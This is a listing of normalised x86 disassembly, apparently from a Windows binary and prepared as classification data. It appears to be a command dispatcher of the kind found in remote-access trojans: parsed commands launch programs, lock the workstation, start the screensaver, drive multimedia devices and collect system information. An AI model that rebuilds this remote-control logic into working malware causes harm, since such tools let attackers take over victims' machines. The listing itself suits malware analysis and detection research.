mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
push 0x2
lea edx [ ebp - 0x460 ]
mov eax [ r-xdata ]
call sub_45eac4
mov eax [ ebp - 0x460 ]
push eax
mov eax [ eax ]
call [ eax + 0x74 ]
call sub_40711c
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
push 0xa
lea edx [ ebp - 0x464 ]
mov eax [ r-xdata ]
call sub_45eac4
mov eax [ ebp - 0x464 ]
push eax
mov eax [ eax ]
call [ eax + 0x74 ]
call sub_40711c
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
push 0x22
lea edx [ ebp - 0x468 ]
mov eax [ r-xdata ]
call sub_45eac4
mov eax [ ebp - 0x468 ]
push eax
mov eax [ eax ]
call [ eax + 0x74 ]
call sub_40711c
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
push 0x1
lea edx [ ebp - 0x46c ]
mov eax [ r-xdata ]
call sub_45eac4
mov eax [ ebp - 0x46c ]
push eax
mov eax [ eax ]
call [ eax + 0x74 ]
call sub_40711c
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea edx [ ebp - 0x470 ]
mov eax [ r-xdata ]
call sub_45eac4
mov eax [ ebp - 0x470 ]
push eax
mov eax [ eax ]
call [ eax + 0x3c ]
call sub_40711c
lea eax [ ebp - 0x4a4 ]
push eax
mov ecx 0xa
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x4a4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x474 ]
call sub_405d28
push eax
lea edx [ ebp - 0x478 ]
mov eax [ r-xdata ]
call sub_45eac4
mov eax [ ebp - 0x478 ]
push eax
mov eax [ eax ]
call [ eax + 0x90 ]
call sub_40711c
mov edx [ ebp - 0x474 ]
lea eax [ ebp - 0xc ]
call sub_4057d4
lea eax [ ebp - 0x47c ]
call sub_405d28
push eax
lea edx [ ebp - 0x480 ]
mov eax [ r-xdata ]
call sub_45eac4
mov eax [ ebp - 0x480 ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
call sub_40711c
mov edx [ ebp - 0x47c ]
lea eax [ ebp - 0x10 ]
call sub_4057d4
call sub_4700d8
cmp al 0x1
jne r-xdata
lea eax [ ebp - 0x4ac ]
push eax
mov ecx 0xa
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x4ac ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xa
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
push ebp
lea eax [ ebp - 0x4a8 ]
call sub_4703fc
mov eax [ ebp - 0x4a8 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
call sub_475fd8
pop ecx
call sub_4700d8
cmp al 0x1
jne r-xdata
lea eax [ ebp - 0x484 ]
call sub_405d28
push eax
lea edx [ ebp - 0x488 ]
mov eax [ r-xdata ]
call sub_45eac4
mov eax [ ebp - 0x488 ]
push eax
mov eax [ eax ]
call [ eax + 0x6c ]
call sub_40711c
mov edx [ ebp - 0x484 ]
lea eax [ ebp - 0x14 ]
call sub_4057d4
lea eax [ ebp - 0x4b0 ]
push eax
mov ecx 0xa
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x4b0 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xa
mov edx 0x1
call sub_405a84
call sub_4700d8
cmp al 0x1
jne r-xdata
lea eax [ ebp - 0x494 ]
call sub_405d28
push eax
lea edx [ ebp - 0x498 ]
mov eax [ r-xdata ]
call sub_45eac4
mov eax [ ebp - 0x498 ]
push eax
mov eax [ eax ]
call [ eax + 0x80 ]
call sub_40711c
mov edx [ ebp - 0x494 ]
lea eax [ ebp - 0x1c ]
call sub_4057d4
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x48c ]
call sub_405d28
push eax
lea edx [ ebp - 0x490 ]
mov eax [ r-xdata ]
call sub_45eac4
mov eax [ ebp - 0x490 ]
push eax
mov eax [ eax ]
call [ eax + 0x70 ]
call sub_40711c
mov edx [ ebp - 0x48c ]
lea eax [ ebp - 0x18 ]
call sub_4057d4
lea eax [ ebp - 0x4b4 ]
push eax
mov ecx 0xc
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x4b4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xa
mov edx 0x1
call sub_405a84
call sub_4700d8
cmp al 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_470784
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4055c8
lea eax [ ebp - 0x4b8 ]
push eax
mov ecx 0xe
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x4b8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xc
mov edx 0x1
call sub_405a84
call sub_4700d8
cmp al 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_47037c
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_4055c8
lea eax [ ebp - 0x4bc ]
push eax
mov ecx 0x15
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x4bc ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xe
mov edx 0x1
call sub_405a84
call sub_4700d8
cmp al 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_4708d0
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
lea eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_4055c8
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x15
mov edx 0x1
call sub_405a84
mov eax [ rw-data ]
mov [ eax ] 0x1
mov eax [ rw-data ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
mov eax [ rw-data ]
mov edx [ ebp - 0x8 ]
call sub_405584
mov eax [ ebp - 0x8 ]
call sub_470a1c
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx r-xdata
call sub_4055c8
lea eax [ ebp - 0x4c0 ]
push eax
mov ecx 0xe
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x4c0 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
push r-xdata
push [ ebp - 0xc ]
push r-xdata
push [ ebp - 0x10 ]
push r-xdata
push [ ebp - 0x14 ]
push r-xdata
push [ ebp - 0x18 ]
push r-xdata
push [ ebp - 0x1c ]
push r-xdata
lea eax [ ebp - 0x4a0 ]
call sub_470178
push [ ebp - 0x4a0 ]
lea eax [ ebp - 0x49c ]
mov edx 0xc
call sub_4058e0
mov eax [ ebp - 0x49c ]
call sub_475e2c
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_4055c8
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xe
mov edx 0x1
call sub_405a84
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x1
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
push ebp
lea edx [ ebp - 0x4c8 ]
mov eax 0x1a
call sub_48adcc
lea eax [ ebp - 0x4c8 ]
mov edx r-xdata
call sub_405818
mov eax [ ebp - 0x4c8 ]
lea edx [ ebp - 0x4c4 ]
call sub_480e44
mov eax [ ebp - 0x4c4 ]
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_475fd8
pop ecx
mov eax r-xdata
call sub_475e2c
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x0
push r-xdata
push 0x0
push 0x0
call CreateThread
mov eax [ rw-data ]
mov [ eax ] 0x1
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ rw-data ]
mov [ eax ] 0x1
lea eax [ ebp - 0x4cc ]
push eax
mov ecx 0xe
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x4cc ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xe
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
lea edx [ ebp - 0x4d4 ]
mov eax 0x1a
call sub_48adcc
push [ ebp - 0x4d4 ]
push r-xdata
push [ ebp - 0xc ]
lea eax [ ebp - 0x4d0 ]
mov edx 0x3
call sub_4058e0
mov eax [ ebp - 0x4d0 ]
call sub_40a26c
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax 0x11
call sub_48a070
push ebp
lea edx [ ebp - 0x4e0 ]
mov eax 0x1a
call sub_48adcc
push [ ebp - 0x4e0 ]
push r-xdata
push [ ebp - 0xc ]
lea eax [ ebp - 0x4dc ]
mov edx 0x3
call sub_4058e0
mov eax [ ebp - 0x4dc ]
lea edx [ ebp - 0x4d8 ]
call sub_48aab0
mov eax [ ebp - 0x4d8 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
call sub_475fd8
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax 0x12
call sub_48a070
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax 0x10
call sub_48a070
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax 0x18
call sub_48a070
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
push 0x0
push 0xf140
push 0x112
push 0x0
call SendMessageA
lea eax [ ebp - 0x4e4 ]
push eax
mov ecx 0xb
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x4e4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
call LockWorkStation
lea eax [ ebp - 0x540 ]
push eax
mov ecx 0xd
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x540 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xb
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
lea eax [ ebp - 0x4e8 ]
mov edx [ rw-data ]
mov edx [ edx ]
call sub_405728
push [ ebp - 0x4e8 ]
push r-xdata
lea edx [ ebp - 0x4ec ]
mov eax [ rw-data ]
movzx eax [ eax ]
call sub_409d70
push [ ebp - 0x4ec ]
push r-xdata
lea eax [ ebp - 0x4f0 ]
call sub_48d6a4
push [ ebp - 0x4f0 ]
push r-xdata
lea eax [ ebp - 0x4f4 ]
call sub_48ceb0
push [ ebp - 0x4f4 ]
push r-xdata
lea eax [ ebp - 0x4f8 ]
call sub_48ce74
push [ ebp - 0x4f8 ]
push r-xdata
lea eax [ ebp - 0x4fc ]
call sub_48d3c4
push [ ebp - 0x4fc ]
push r-xdata
lea eax [ ebp - 0x500 ]
call sub_46d2ec
push [ ebp - 0x500 ]
push r-xdata
push r-xdata
push r-xdata
lea eax [ ebp - 0x504 ]
call sub_48cf38
push [ ebp - 0x504 ]
push r-xdata
lea eax [ ebp - 0x508 ]
call sub_48d1f4
push [ ebp - 0x508 ]
push r-xdata
lea eax [ ebp - 0x50c ]
call sub_48d248
push [ ebp - 0x50c ]
push r-xdata
lea eax [ ebp - 0x510 ]
call sub_48d298
push [ ebp - 0x510 ]
push r-xdata
lea eax [ ebp - 0x514 ]
call sub_48d2fc
push [ ebp - 0x514 ]
push r-xdata
lea eax [ ebp - 0x518 ]
call sub_48d6d4
push [ ebp - 0x518 ]
push r-xdata
lea eax [ ebp - 0x51c ]
call sub_48d704
push [ ebp - 0x51c ]
push r-xdata
lea eax [ ebp - 0x520 ]
call sub_48d9b0
push [ ebp - 0x520 ]
push r-xdata
lea eax [ ebp - 0x528 ]
call sub_46d9e0
mov eax [ ebp - 0x528 ]
lea edx [ ebp - 0x524 ]
call sub_48da48
push [ ebp - 0x524 ]
push r-xdata
lea edx [ ebp - 0x52c ]
xor eax eax
call sub_40f234
push [ ebp - 0x52c ]
push r-xdata
mov eax [ rw-data ]
push [ eax ]
push r-xdata
mov eax [ rw-data ]
push [ eax ]
push r-xdata
lea edx [ ebp - 0x534 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x534 ]
lea edx [ ebp - 0x530 ]
call sub_48bbdc
push [ ebp - 0x530 ]
push r-xdata
lea eax [ ebp - 0x538 ]
call sub_48bc6c
push [ ebp - 0x538 ]
push r-xdata
lea eax [ ebp - 0x53c ]
call sub_48cbc4
push [ ebp - 0x53c ]
lea eax [ ebp - 0xc ]
mov edx 0x2d
call sub_4058e0
push ebp
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_475fd8
pop ecx
lea eax [ ebp - 0x544 ]
push eax
mov ecx 0xb
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x544 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xd
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0x548 ]
push eax
mov ecx 0x9
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x548 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xb
mov edx 0x1
call sub_405a84
push 0x5
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
push r-xdata
push 0x0
call ShellExecuteA
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fa34
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ eax + 0xf ] 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x5
call sub_41fc40
mov eax [ ebp - 0xc ]
call sub_409edc
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_485d50
mov eax [ rw-data ]
mov eax [ eax ]
mov edx r-xdata
call sub_485d54
mov eax [ rw-data ]
mov eax [ eax ]
call sub_41fef0
mov eax [ rw-data ]
mov eax [ eax ]
call sub_485da0
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x9
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x54c ]
call sub_489bb0
lea eax [ ebp - 0x54c ]
mov edx r-xdata
call sub_405818
mov edx [ ebp - 0x54c ]
mov eax [ ebp - 0x8 ]
call sub_48ab58
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x550 ]
call sub_489bb0
lea eax [ ebp - 0x550 ]
mov edx r-xdata
call sub_405818
mov eax [ ebp - 0x550 ]
call sub_4059dc
push eax
push r-xdata
push 0x0
call ShellExecuteA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x554 ]
call sub_470b68
cmp [ ebp - 0x554 ] 0x0
je r-xdata
lea eax [ ebp - 0x574 ]
push eax
mov ecx 0x9
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x574 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x570 ]
call sub_470b68
mov ecx [ ebp - 0x570 ]
lea eax [ ebp - 0x56c ]
mov edx r-xdata
call sub_405864
mov eax [ ebp - 0x56c ]
call sub_475e2c
lea eax [ ebp - 0x560 ]
call sub_470b94
cmp [ ebp - 0x560 ] 0x0
je r-xdata
lea eax [ ebp - 0x55c ]
call sub_470b68
mov ecx [ ebp - 0x55c ]
lea eax [ ebp - 0x558 ]
mov edx r-xdata
call sub_405864
mov eax [ ebp - 0x558 ]
call sub_475e2c
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x9
mov edx 0x1
call sub_405a84
movzx eax [ r-xdata ]
push eax
lea eax [ ebp - 0x578 ]
push eax
mov ecx r-xdata
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_40ef44
mov edx [ ebp - 0x578 ]
lea eax [ ebp - 0x8 ]
call sub_4055c8
call sub_431a7c
mov edx [ ebp - 0x8 ]
call sub_431604
lea eax [ ebp - 0x568 ]
call sub_470b94
mov ecx [ ebp - 0x568 ]
lea eax [ ebp - 0x564 ]
mov edx r-xdata
call sub_405864
mov eax [ ebp - 0x564 ]
call sub_475e2c
lea eax [ ebp - 0x57c ]
push eax
mov ecx 0xa
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x57c ]
mov edx r-xdata
call sub_405974
jne r-xdata
call sub_431a7c
mov edx [ eax ]
call [ edx + 0x10 ]
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xa
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
push ebp
lea eax [ ebp - 0x580 ]
call sub_470d2c
mov eax [ ebp - 0x580 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
call sub_475fd8
pop ecx
lea eax [ ebp - 0x594 ]
push eax
mov ecx 0xc
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x594 ]
mov edx r-xdata
call sub_405974
jne r-xdata
push 0x0
call CoInitialize
xor eax eax
push ebp
push sub_47a077
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x588 ]
call sub_464f98
mov eax [ ebp - 0x588 ]
lea edx [ ebp - 0x584 ]
call sub_409b7c
cmp [ ebp - 0x584 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xc
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
push ebp
lea eax [ ebp - 0x598 ]
call sub_48ac14
mov eax [ ebp - 0x598 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
call sub_475fd8
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
call CoUninitialize
retn
lea eax [ ebp - 0x590 ]
call sub_464f98
mov ecx [ ebp - 0x590 ]
lea eax [ ebp - 0x58c ]
mov edx r-xdata
call sub_405864
mov eax [ ebp - 0x58c ]
call sub_475e2c
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
call sub_46dc28
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
call sub_46dc4c
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
call sub_46da50
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
call sub_46dab4
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
call sub_46db18
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
call sub_46db5c
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
call sub_46dba0
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
call sub_46dbe4
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
call sub_4710a0
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
call sub_471078
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
xor eax eax
call sub_4710f0
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov al 0x1
call sub_4710f0
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
xor eax eax
call sub_471010
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov al 0x1
call sub_471010
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov al 0x1
call sub_470ed4
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
xor eax eax
call sub_470ed4
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
call sub_4710c8
lea eax [ ebp - 0x59c ]
push eax
mov ecx 0x3
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x59c ]
mov edx r-xdata
call sub_405974
jne r-xdata
push 0x0
push 0x0
push 0x0
push r-xdata
call mciSendStringA
lea eax [ ebp - 0x5a0 ]
push eax
mov ecx 0xc
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x5a0 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x3
mov edx 0x1
call sub_405a84
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fa34
mov ebx eax
mov [ ebx + 0xf ] 0x1
mov dl 0x5
mov eax ebx
call sub_41fc40
xor edx edx
mov eax ebx
call sub_485d50
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_485da8
mov edx r-xdata
mov eax ebx
call sub_485d54
mov eax ebx
call sub_41fef0
lea eax [ ebp - 0x5a4 ]
push eax
mov ecx 0x9
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x5a4 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xc
mov edx 0x1
call sub_405a84
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x9
mov edx 0x1
call sub_405a84
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fa34
mov ebx eax
mov [ ebx + 0xf ] 0x1
mov dl 0x5
mov eax ebx
call sub_41fc40
mov dx 0x3
mov eax ebx
call sub_484ee8
lea eax [ ebp - 0x5a8 ]
mov ecx r-xdata
mov edx [ ebp - 0x8 ]
call sub_405864
mov edx [ ebp - 0x5a8 ]
mov eax ebx
call sub_484f08
mov edx r-xdata
mov eax ebx
call sub_484f74
mov eax ebx
call sub_41fef0
xor eax eax
call sub_475bd8
mov al 0x1
call sub_475bd8
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx ]
lea eax [ ebp - 0x5ac ]
mov edx r-xdata
call sub_405864
mov eax [ ebp - 0x5ac ]
call sub_475e2c
lea eax [ ebp - 0x5bc ]
push eax
mov ecx 0x9
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x5bc ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x5b0 ]
call sub_470b68
cmp [ ebp - 0x5b0 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x9
mov edx 0x1
call sub_405a84
call sub_431a7c
mov edx [ ebp - 0x8 ]
call sub_431604
lea eax [ ebp - 0x5b8 ]
call sub_470b68
mov ecx [ ebp - 0x5b8 ]
lea eax [ ebp - 0x5b4 ]
mov edx r-xdata
call sub_405864
mov eax [ ebp - 0x5b4 ]
call sub_475e2c
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
push 0x5
push 0x0
